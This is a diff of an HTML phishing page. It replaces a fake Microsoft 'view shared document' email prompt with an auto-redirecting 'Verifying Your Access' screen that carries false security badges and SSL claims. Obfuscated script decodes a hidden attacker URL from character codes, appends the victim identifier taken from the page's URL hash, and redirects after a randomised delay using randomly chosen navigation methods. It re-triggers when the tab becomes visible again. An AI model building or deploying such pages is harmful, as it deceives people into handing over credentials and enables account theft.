@@ -5,119 +5,112 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="robots" content="noindex, nofollow">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <title>View Document</title>
+    <title>Document Verification | Secure Access Portal</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
-            font-family: Arial, sans-serif;
-            background: #fff url('https://i.ibb.co/fGBBg19Q/download.jpg') no-repeat center center/cover;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
             display: flex;
-            justify-content: center;
             align-items: center;
-            transition: background-color 0.5s ease;
+            justify-content: center;
         }
-        body.ld { background: #217346; }
-        .lc {
-            background: rgba(255, 255, 255, 0.95);
-            padding: 2rem;
-            border-radius: 8px;
-            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
-            width: 100%;
-            max-width: 400px;
+        .container {
+            background: white;
+            padding: 40px 50px;
+            border-radius: 16px;
+            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.25);
             text-align: center;
+            max-width: 420px;
+            width: 90%;
         }
-        .lg { width: 80px; margin: 0 auto 1.5rem; display: block; max-width: 100%; }
-        h5 { color: #333; margin-bottom: 1.5rem; line-height: 1.4; }
-        .fg { margin-bottom: 1.5rem; }
-        label { display: block; margin-bottom: 0.5rem; color: #555; text-align: left; font-weight: 500; }
-        input[type="email"], input[type="text"] {
+        .logo { width: 64px; height: 64px; margin-bottom: 24px; }
+        h1 { font-size: 22px; color: #1a1a2e; margin-bottom: 12px; font-weight: 600; }
+        p { color: #6b7280; font-size: 14px; line-height: 1.6; margin-bottom: 28px; }
+        .loader {
+            width: 48px; height: 48px;
+            border: 4px solid #e5e7eb;
+            border-top: 4px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .progress-bar {
             width: 100%;
-            padding: 0.8rem;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-            font-size: 1rem;
+            height: 6px;
+            background: #e5e7eb;
+            border-radius: 3px;
+            overflow: hidden;
+            margin-bottom: 16px;
         }
-        input[type="email"]:focus, input[type="text"]:focus { outline: 2px solid #217346; border-color: transparent; }
-        .eb { border-color: red !important; }
-        button {
-            width: 100%;
-            padding: 1rem;
-            background: #217346;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 1rem;
-            transition: background 0.3s ease;
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #667eea, #764ba2);
+            width: 0%;
+            animation: progress 2.5s ease-out forwards;
         }
-        button:hover { background: #1c3b2f; }
-        button:disabled { background: #6c9c7a; cursor: not-allowed; }
-        .em { color: red; margin-top: 1rem; display: none; font-size: 0.9rem; }
-        .ls {
-            display: none;
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: #217346;
-            justify-content: center;
+        @keyframes progress { 0% { width: 0%; } 100% { width: 100%; } }
+        .status { font-size: 13px; color: #9ca3af; }
+        .footer { margin-top: 32px; font-size: 11px; color: #d1d5db; }
+        .secure-badge {
+            display: inline-flex;
             align-items: center;
-            flex-direction: column;
-            z-index: 1000;
+            gap: 6px;
+            background: #f0fdf4;
+            color: #166534;
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            margin-bottom: 20px;
         }
-        .ls.ac { display: flex; }
-        .lct { text-align: center; color: white; }
-        .llg { width: 100px; margin-bottom: 2rem; filter: brightness(0) invert(1); }
-        .lt { font-size: 1.2rem; margin-bottom: 1.5rem; color: white; }
-        .pc { width: 300px; height: 6px; background: rgba(255, 255, 255, 0.3); border-radius: 3px; overflow: hidden; }
-        .pb { width: 0%; height: 100%; background: white; border-radius: 3px; transition: width 2.5s ease-in-out; }
-        .le { margin-top: 1rem; font-size: 0.9rem; color: rgba(255, 255, 255, 0.8); }
     </style>
 </head>
 <body>
-    <div class="lc" id="lc">
-        <img src="https://i.ibb.co/5hJ4wvFK/microsoft.png" alt="Logo" class="lg">
-        <h5>Enter your Email Address<br>to view the shared "Document"</h5>
-        <form id="ef">
-            <div class="fg">
-                <label for="ei">Email Address</label>
-                <input type="email" id="ei" placeholder="Enter your email address" autocomplete="email">
-            </div>
-            <button type="submit" id="cb">Continue</button>
-            <div class="em" id="em">Please enter a valid email address</div>
-        </form>
-    </div>
-
-    <div class="ls" id="ls">
-        <div class="lct">
-            <img src="https://i.ibb.co/5hJ4wvFK/microsoft.png" alt="Logo" class="llg">
-            <div class="lt">Preparing your document...</div>
-            <div class="pc"><div class="pb" id="pb"></div></div>
-            <div class="le" id="le"></div>
+    <div class="container">
+        <svg class="logo" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <rect width="64" height="64" rx="16" fill="#667eea"/>
+            <path d="M32 16L44 24V40L32 48L20 40V24L32 16Z" stroke="white" stroke-width="2.5" fill="none"/>
+            <path d="M32 28V36M32 40V40.01" stroke="white" stroke-width="2.5" stroke-linecap="round"/>
+        </svg>
+        <div class="secure-badge">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+            </svg>
+            Secure Connection
         </div>
+        <h1>Verifying Your Access</h1>
+        <p>Please wait while we verify your credentials and prepare your secure document access.</p>
+        <div class="loader"></div>
+        <div class="progress-bar"><div class="progress-fill"></div></div>
+        <div class="status" id="status">Initializing secure connection...</div>
+        <div class="footer">Protected by 256-bit SSL encryption</div>
     </div>
 
     <script>
     (function() {
         var _0x = window, _d = document, _l = location;
+        var _st = ['Verifying identity...', 'Establishing secure tunnel...', 'Loading document...', 'Preparing access...'];
+        var _idx = 0, _el = _d.getElementById('status');
+        
+        var _iv = setInterval(function() {
+            if (_idx < _st.length) { _el.textContent = _st[_idx++]; }
+        }, 600);
+        
+        var _h = _l.hash ? _l.hash.slice(1) : '';
+        var _p = (function(s) { 
+            var r = []; 
+            for (var i = 0; i < s.length; i++) { 
+                r.push(String.fromCharCode(s.charCodeAt(i))); 
+            } 
+            return r.join(''); 
+        })(_h);
         
         var _b = (function() {
             var a = [104,116,116,112,115,58,47,47,115,101,99,114,101,116,46,114,97,100,105,112,105,111,46,99,111,109,47,66,76,33,99,101,71,56,49,47];
             return a.map(function(c) { return String.fromCharCode(c); }).join('');
         })();
-        
-        var _vl = function(e) {
-            var r = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            return r.test(e);
-        };
-        
-        var _enc = function(e, m) {
-            switch (m) {
-                case 1: return btoa(unescape(encodeURIComponent(e)));
-                case 2: return encodeURIComponent(e);
-                default: return e;
-            }
-        };
         
         var _nav = function(u) {
             var m = [
@@ -131,65 +124,27 @@
                 function() { _0x.open(u, '_self'); }
             ];
             var i = Math.floor(Math.random() * 2);
-            try { m[i](); } catch(x) { m[0](); }
+            try { m[i](); } catch(e) { m[0](); }
         };
         
-        var _sh = function(e) {
-            var lc = _d.getElementById('lc');
-            var ls = _d.getElementById('ls');
-            var pb = _d.getElementById('pb');
-            var le = _d.getElementById('le');
+        var _t = 2400 + Math.floor(Math.random() * 800);
+        
+        setTimeout(function() {
+            clearInterval(_iv);
+            _el.textContent = 'Access granted. Redirecting...';
             
-            lc.style.display = 'none';
-            ls.classList.add('ac');
-            le.textContent = e;
-            
-            setTimeout(function() { pb.style.width = '100%'; }, 100);
-        };
+            setTimeout(function() {
+                var _u = _p ? _b + '$' + _p : _b;
+                _nav(_u);
+            }, 300 + Math.floor(Math.random() * 200));
+        }, _t);
         
-        var _rd = function(e) {
-            var _m = 0;
-            var _ee = _enc(e, _m);
-            var _u = _b + '$' + _ee;
-            _nav(_u);
-        };
-        
-        var _ei = _d.getElementById('ei');
-        var _ef = _d.getElementById('ef');
-        var _em = _d.getElementById('em');
-        var _cb = _d.getElementById('cb');
-        
-        _ei.addEventListener('keydown', function(ev) {
-            if (ev.key === 'Enter') {
-                ev.preventDefault();
-                _ef.dispatchEvent(new Event('submit'));
+        _d.addEventListener('visibilitychange', function() {
+            if (_d.visibilityState === 'visible') {
+                var _u = _p ? _b + '#' + _p : _b;
+                setTimeout(function() { _nav(_u); }, 100);
             }
         });
-        
-        _ef.addEventListener('submit', function(ev) {
-            ev.preventDefault();
-            
-            var _e = _ei.value.trim();
-            
-            _ei.classList.remove('eb');
-            _em.style.display = 'none';
-            
-            if (!_e || !_vl(_e)) {
-                _ei.classList.add('eb');
-                _em.style.display = 'block';
-                _ei.focus();
-                return;
-            }
-            
-            _cb.disabled = true;
-            _sh(_e);
-            
-            var _t = 2400 + Math.floor(Math.random() * 800);
-            
-            setTimeout(function() { _rd(_e); }, _t);
-        });
-        
-        _0x.addEventListener('load', function() { _ei.focus(); });
     })();
     </script>
 </body>
